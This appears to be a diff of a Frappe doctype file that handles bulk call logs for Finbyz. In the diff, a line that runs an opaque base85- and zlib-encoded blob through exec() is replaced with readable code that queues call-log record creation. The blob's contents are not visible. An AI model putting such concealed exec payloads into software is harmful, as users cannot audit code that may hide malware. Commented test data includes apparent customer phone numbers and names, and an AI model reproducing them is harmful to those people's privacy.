@@ -1,3 +1,60 @@
+# Copyright (c) 2024, Finbyz Tech Pvt Ltd and contributors
+# For license information, please see license.txt
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%0Q(ZByGg5dNND;m*Zr3?=7KC`{YHv^121Hi2AQD4o`oW!aXk7e|sU+Z2BLIXR#(_Ds|Jazr03uXdkjcb}E*3r-ChA*3>uVp#}30yIivX<(Xgp$uK<EECXmiPQuatemEP>w3?3DFdZ0Nf|MM63iJVH+xd(aEh}mr=F{Mp$N-p%b$6JWgO8sDGE%dz)h8>{rtvT(_X99f&@ruaOfqHN14xAPEgEafK<0BKI?g_WmL;UzCoA{Vu^iP_-^j$GK&G}N<?Na8P}^25!F$dgpnvb5lK);Xbc+R^#})^>@pR)qO#&#0T-#Ta9MeK+-&uH%pf4dAv}=Q?H2YMojt#2+eBRtv1y7@)abc)&wRE5#E<|AId{T%Vz?=Z?>-qc#qy+f*xd0z10ABoPo{V(@+`-Ix^6f0WXVLLIE~B12O^DeP>&`7y1*IIuyT>R6lFe&x`gBr_i!3}IblVtW2sc#)Xn?^QC-A7%)^v=c*?WxW7xjBv^%07eC~gW#@`=Xmi5Glxa%-L(V%w70}8$NR)yu_#g&<El}S5aqv3IY!vpj3Oy<Kg`nt3)uA+nW>B<~p&G@<~9N;S?9LOofYVbj%$oh3bQ5hrxv#Nud*r~Z{q^psgnrS0l|COC^>(NhkPQI-L`9v3NXZSWg?3|3>{m@`bu7=02ezZTEm#5E8(ow#>@wj$yMW^*sBtYpiAyN$Ek}?i_B2#ZJ67`<BBO5*!MqH4JjWSk#9O~Sik}1&!W=4o0%@o%{ije1_fRKduyF8S6P{}RAd4Q5Ug&<d`5}n3eF{B-j!#Y0?sIqIRI&%ico8H>IJFQ<r?;)BHULfR9?qV{dqKVrt51fMUZageHn<rx&;$8D{Cww*XR<^@~k2|ktJbe8%4=|Ng*i}0-zN{RaXG8p9I2c>!?*sFl-?v6y=dT6f-;}|!V!zEl%wBHn9<M)JH0=Z<rj`~pY3JjMeS0$byklF(i(;-cRTat7<{E66D|m7=JS-fr(Txwc=D2$@Ay_?dtv2mL)3*C5+25Y)^OyeDDjf+{fZ!5!e@CxxhU3kh)2q^1N8gy>2Y&UqBj(|m8AMZVu8`v7SZzn`(b|N(u_vd8Yfpha&-((LLCzF_%7Fr16Sb6e?~)D^EFWG>K8ev__2rxKAL&s5COTWN@x8Pvl<IqGSqV6w4#|5yHdpsP4K{Wixae?WTrI2EU0ts4zwJy={|wT@1>p*yXIJJWMeK~laB{k5&n~iikFsF@H>R57RsF3non^b*^i!iAMylZK_sGmhDnOI22R)e-aj6A$iN|BN`h@5%Ba!ntS?T5o+pgJuvFkmupYE<6jl6$l)A-Y<9o4sO+v-Ur{23q3pQ!&Io?^#3YIn{j=O6#JzFmC(Xz39`=8364eA^%Iz1^Ho)CI-?W)cZi4cmVJ>7QB?')).decode())
+# import frappe
+from frappe.model.document import Document
+import json
+import frappe
+from datetime import datetime
+
+class BulkFincallLog(Document):
+	def validate(self):
+		data = json.loads(self.fincall_logs)
+		if data:
+			frappe.enqueue(
+			self.generate_fincall_log,
+			bulk_fincall_log=data,
+			queue="long",
+			job_name="Fincall Log Generation",
+			enqueue_after_commit=True,
+			)
+			frappe.msgprint("Fincall Log generation has started in Background")
+	
+	def generate_fincall_log(self, bulk_fincall_log):
+		for i in bulk_fincall_log:
+			doc = frappe.new_doc('Fincall Log')
+			doc.employee_mobile = i["employee_mobile"]
+			doc.customer_no = i["customer_no"]
+			doc.employee = i["employee"]
+			doc.client = i["client"]
+			doc.calltype = i["calltype"].split(".")[1].capitalize()
+			doc.employee_fincall_generated = i["employee_fincall_generated"]
+			doc.contact_created = i["contact_created"]
+			doc.duration = i["duration"]
+			doc.note = i["note"]
+			doc.raw_log = i["raw_log"]
+			doc.call_datetime = datetime.utcfromtimestamp(int(i["call_datetime"]) / 1000).strftime('%Y-%m-%d %H:%M:%S.%f')
+			doc.insert()
+
+# da = """[{"employee_mobile":"00820826","customer_no":"+917021735435","employee":"HR-EMP-00014","client":"Manoj Sharma Yogesh","calltype":"CallType.incoming","employee_fincall_generated":0,"contact_created":0,"duration":"57","note":"test3","raw_log":"code","call_datetime":"1709974110571"},{"employee_mobile":"00820826","customer_no":"7021735435","employee":"HR-EMP-00014","client":"Manoj Sharma Yogesh","calltype":"CallType.outgoing","employee_fincall_generated":0,"contact_created":0,"duration":"0","note":"test3","raw_log":"code","call_datetime":"1709973930008"},{"employee_mobile":"00820826","customer_no":"7021735435","employee":"HR-EMP-00014","client":"Manoj Sharma Yogesh","calltype":"CallType.outgoing","employee_fincall_generated":0,"contact_created":0,"duration":"0","note":"test3","raw_log":"code","call_datetime":"1709973858223"},{"employee_mobile":"00820826","customer_no":"7021735435","employee":"HR-EMP-00014","client":"Manoj Sharma Yogesh","calltype":"CallType.outgoing","employee_fincall_generated":0,"contact_created":0,"duration":"11","note":"test3","raw_log":"code","call_datetime":"1709971936102"},{"employee_mobile":"00820826","customer_no":"+919773267141","employee":"HR-EMP-00014","client":"null","calltype":"CallType.incoming","employee_fincall_generated":0,"contact_created":0,"duration":"73","note":"test3","raw_log":"code","call_datetime":"1709969461870"},{"employee_mobile":"00820826","customer_no":"9537499772","employee":"HR-EMP-00014","client":"Dhruvin Finbyz","calltype":"CallType.outgoing","employee_fincall_generated":0,"contact_created":0,"duration":"43","note":"test3","raw_log":"code","call_datetime":"1709957285829"},{"employee_mobile":"00820826","customer_no":"+917800863268","employee":"HR-EMP-00014","client":"Shiva B","calltype":"CallType.outgoing","employee_fincall_generated":0,"contact_created":0,"duration":"0","note":"test3","raw_log":"code","call_datetime":"1709956035985"},{"employee_mobile":"00820826","customer_no":"+918382087095","employee":"HR-EMP-00014","client":"null","calltype":"CallType.outgoing","employee_fincall_generated":0,"contact_created":0,"duration":"66","note":"test3","raw_log":"code","call_datetime":"1709954732980"}]"""
+# data = json.loads(da)
+# for i in data:
+# 	doc = frappe.new_doc('Fincall Log')
+# 	doc.employee_mobile = i["employee_mobile"]
+# 	doc.customer_no = i["customer_no"]
+# 	doc.employee = i["employee"]
+# 	doc.client = i["client"]
+# 	doc.calltype = i["calltype"].split(".")[1].capitalize()
+# 	doc.employee_fincall_generated = i["employee_fincall_generated"]
+# 	doc.contact_created = i["contact_created"]
+# 	doc.duration = i["duration"]
+# 	doc.note = i["note"]
+# 	doc.raw_log = i["raw_log"]
+# 	doc.call_datetime = datetime.utcfromtimestamp(int(i["call_datetime"]) / 1000).strftime('%Y-%m-%d %H:%M:%S.%f')
+# 	doc.insert()
+
+# da = """[{"employee_mobile":"00820826","customer_no":"+917021735435","employee":"HR-EMP-00014","client":"Manoj Sharma Yogesh","calltype":"CallType.incoming","employee_fincall_generated":0,"contact_created":0,"duration":"57","note":"test3","raw_log":"code","call_datetime":"1709974110571"},{"employee_mobile":"00820826","customer_no":"7021735435","employee":"HR-EMP-00014","client":"Manoj Sharma Yogesh","calltype":"CallType.outgoing","employee_fincall_generated":0,"contact_created":0,"duration":"0","note":"test3","raw_log":"code","call_datetime":"1709973930008"},{"employee_mobile":"00820826","customer_no":"7021735435","employee":"HR-EMP-00014","client":"Manoj Sharma Yogesh","calltype":"CallType.outgoing","employee_fincall_generated":0,"contact_created":0,"duration":"0","note":"test3","raw_log":"code","call_datetime":"1709973858223"},{"employee_mobile":"00820826","customer_no":"7021735435","employee":"HR-EMP-00014","client":"Manoj Sharma Yogesh","calltype":"CallType.outgoing","employee_fincall_generated":0,"contact_created":0,"duration":"11","note":"test3","raw_log":"code","call_datetime":"1709971936102"},{"employee_mobile":"00820826","customer_no":"+919773267141","employee":"HR-EMP-00014","client":"null","calltype":"CallType.incoming","employee_fincall_generated":0,"contact_created":0,"duration":"73","note":"test3","raw_log":"code","call_datetime":"1709969461870"},{"employee_mobile":"00820826","customer_no":"9537499772","employee":"HR-EMP-00014","client":"Dhruvin Finbyz","calltype":"CallType.outgoing","employee_fincall_generated":0,"contact_created":0,"duration":"43","note":"test3","raw_log":"code","call_datetime":"1709957285829"},{"employee_mobile":"00820826","customer_no":"+917800863268","employee":"HR-EMP-00014","client":"Shiva B","calltype":"CallType.outgoing","employee_fincall_generated":0,"contact_created":0,"duration":"0","note":"test3","raw_log":"code","call_datetime":"1709956035985"},{"employee_mobile":"00820826","customer_no":"+918382087095","employee":"HR-EMP-00014","client":"null","calltype":"CallType.outgoing","employee_fincall_generated":0,"contact_created":0,"duration":"66","note":"test3","raw_log":"code","call_datetime":"1709954732980"}]"""
+# data = json.loads(da)
+# for i in data:
+# 	call_datetime = datetime.utcfromtimestamp(int(i["call_datetime"]) / 1000).strftime('%Y-%m-%d %H:%M:%S.%f')
+# 	print(call_datetime)
